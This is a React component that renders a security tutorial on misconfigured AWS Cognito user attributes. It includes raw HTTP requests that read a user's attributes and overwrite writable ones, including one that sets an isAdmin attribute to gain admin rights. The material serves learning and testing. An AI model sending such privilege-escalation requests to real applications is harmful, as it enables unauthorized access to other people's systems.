import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const AWS_Cognito_Misconfigured_Attributes = ({ title }: IProps) => {

    const syntax_7 = `
    POST / HTTP/2
    Host: cognito-idp.us-east-1.amazonaws.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
    Accept: */*
    Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: http://localhost:3000/
    Content-Type: application/x-amz-json-1.1
    X-Amz-Target: AWSCognitoIdentityProviderService.GetUser
    X-Amz-User-Agent: aws-amplify/5.0.4
    Cache-Control: no-store
    Content-Length: 1051
    Origin: http://localhost:3000
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: cross-site
    Te: trailers
    
    {
        "AccessToken":"eyJraWQiOiJueXdGS0pudTRiU1ZTdk5PTGxwNzVJS0hlSUpxRzNtWkp..."
    }`

    const syntax_8 = `
    HTTP/2 200 OK
    Date: Fri, 11 Aug 2023 17:00:04 GMT
    Content-Type: application/x-amz-json-1.1
    Content-Length: 254
    X-Amzn-Requestid: 0c25f19c-4711-4b49-8a2d-bc7ecfc3fa1b
    Access-Control-Allow-Origin: *
    Access-Control-Expose-Headers: x-amzn-RequestId,x-amzn-ErrorType,x-amzn-ErrorMessage,Date
    
    {
        "UserAttributes": [
            {
                "Name": "sub",
                "Value": "744bf586-7150-4358-8789-b2dd78711992"
            },
            {
                "Name": "address",
                "Value": "555 home"
            },
            {
                "Name": "email_verified",
                "Value": "true"
            },
            {
                "Name": "name",
                "Value": "blog user"
            },
            {
                "Name": "phone_number_verified",
                "Value": "false"
            },
            {
                "Name": "email",
                "Value": "blog3@gmail.com"
            }
        ],
        "Username": "blog3"
    }`

    const syntax_9 = `
    POST / HTTP/2
    Host: cognito-idp.us-east-1.amazonaws.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
    Accept: */*
    Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: http://localhost:3000/
    Content-Type: application/x-amz-json-1.1
    X-Amz-Target: AWSCognitoIdentityProviderService.UpdateUserAttributes
    X-Amz-User-Agent: aws-amplify/5.0.4
    Cache-Control: no-store
    Content-Length: 1173
    Origin: http://localhost:3000
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: cross-site
    Te: trailers
    
    {
        "AccessToken":"eyJraWQiOiJueXdGS0pudTRiU1ZTdk5PTGxwNzVJS0hlSUpxRzNtWkp0...",
         "UserAttributes": [ 
            { 
                 "Name": "address",
                 "Value": "hacker"
            }
         ]
    }`

    const syntax_10 = `
    HTTP/2 200 OK
    Date: Fri, 11 Aug 2023 17:00:04 GMT
    Content-Type: application/x-amz-json-1.1
    Content-Length: 254
    X-Amzn-Requestid: 0c25f19c-4711-4b49-8a2d-bc7ecfc3fa1b
    Access-Control-Allow-Origin: *
    Access-Control-Expose-Headers: x-amzn-RequestId,x-amzn-ErrorType,x-amzn-ErrorMessage,Date
    
    {
        "UserAttributes": [
            {
                "Name": "sub",
                "Value": "744bf586-7150-4358-8789-b2dd78711992"
            },
            {
                "Name": "address",
                "Value": "hacker"
            },
            {
                "Name": "email_verified",
                "Value": "true"
            },
            {
                "Name": "name",
                "Value": "blog user"
            },
            {
                "Name": "phone_number_verified",
                "Value": "false"
            },
            {
                "Name": "email",
                "Value": "blog3@gmail.com"
            }
        ],
        "Username": "blog3"
    }`

    const syntax_11 = `
    POST / HTTP/2
    Host: cognito-idp.us-east-1.amazonaws.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
    Accept: */*
    Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: http://localhost:3000/
    Content-Type: application/x-amz-json-1.1
    X-Amz-Target: AWSCognitoIdentityProviderService.UpdateUserAttributes
    X-Amz-User-Agent: aws-amplify/5.0.4
    Cache-Control: no-store
    Content-Length: 1173
    Origin: http://localhost:3000
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: cross-site
    Te: trailers
    
    {
        "AccessToken":"eyJraWQiOiJueXdGS0pudTRiU1ZTdk5PTGxwNzVJS0hlSUpxRzNtWkp0...",
         "UserAttributes": [ 
            { 
                 "Name": "isAdmin",
                 "Value": "True"
            }
         ]
    }`

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
               <Box pt={5} />
              <Typography variant="h6">
                    Description
                </Typography>

                <Typography>
                    AWS Cognito allows users to have attributes. These attributes are additional information on the user that the application may want; such as gender, website, preferred_username, family_name, etc. These attributes can be misconfigured to allow users to write to attributes that the developer didn't intend.
                    </Typography>
                    <Box mt={5}/>
                    <Typography>
                    By default, the following attributes are writeable (minus the attribute prefixed with "custom:"):
                    </Typography>
                    <img src="/aws_cognito_p3_7.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    When a user logs into an application using AWS Cognito User Pools, they will receive an <Box sx={{fontWeight: 'bold', display: 'inline'}}>AccessToken</Box> in the response. You can use this access token to get your attributes on your account with the <Box sx={{fontWeight: 'bold', display: 'inline'}}>X-Amz-Target: AWSCognitoIdentityProviderService.GetUser</Box> header.
                    </Typography>
                    <Box mt={5}/>
                    <Typography sx={{fontStyle: 'italic'}}>
                   Request
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="http">
                        {syntax_7}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography sx={{fontStyle: 'italic'}}>
                   Response
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="http">
                        {syntax_8}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                    As you can see we have the following attributes set on our account. We can check if any of these attributes are writeable using the <Box sx={{fontWeight: 'bold', display: 'inline'}}>X-Amz-Target: AWSCognitoIdentityProviderService.UpdateUserAttributes</Box> header.
                    </Typography>
                    <Box mt={5}/>
                    <Typography>
                    By default there is no real security issue unless the developer made <Box sx={{fontWeight: 'bold', display: 'inline'}}>email_verified</Box> or <Box sx={{fontWeight: 'bold', display: 'inline'}}>phone_number_verified</Box> options writeable (which are not writable by default). There may still be some situations where developers don't want you to be able to change one of these attributes.
                    </Typography>
                    <Box mt={5}/>
                    <Typography sx={{fontStyle: 'italic'}}>
                   Request
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="http">
                        {syntax_9}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                    You can then check if this attribute was changed by making another request to <Box sx={{fontWeight: 'bold', display: 'inline'}}>X-Amz-Target: AWSCognitoIdentityProviderService.GetUser</Box> and checking if the address value changed.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="http">
                        {syntax_10}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                    Like I said previously, changing your own attributes such as address, name, family_name, etc. is not a security issue. The security issue will most likely rely in the misconfiguration of custom attributes. Custom attribute names are always prefixed “custom:” in Amazon Cognito requests.
                    </Typography>
                    <img src="/aws_cognito_p3_8.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    A developer may have an <Box sx={{fontWeight: 'bold', display: 'inline'}}>isAdmin</Box> attribute being set on the users. If this attribute is misconfigured to allow writing to the attribute, then the same process as before can be followed to give yourself admin privilege's.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="http">
                        {syntax_11}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                    Remember, you can then check if it worked by sending the  <Box sx={{fontWeight: 'bold', display: 'inline'}}>AWSCognitoIdentityProviderService.GetUser</Box> shown previously.
                    </Typography>
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Resources">
              <a href="https://www.youtube.com/watch?v=TuiDJ5Ii6MU&ab_channel=NahamSec" target="_blank">
                  <TreeItem nodeId="2" label="YouTube" />
                </a>
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default AWS_Cognito_Misconfigured_Attributes;
  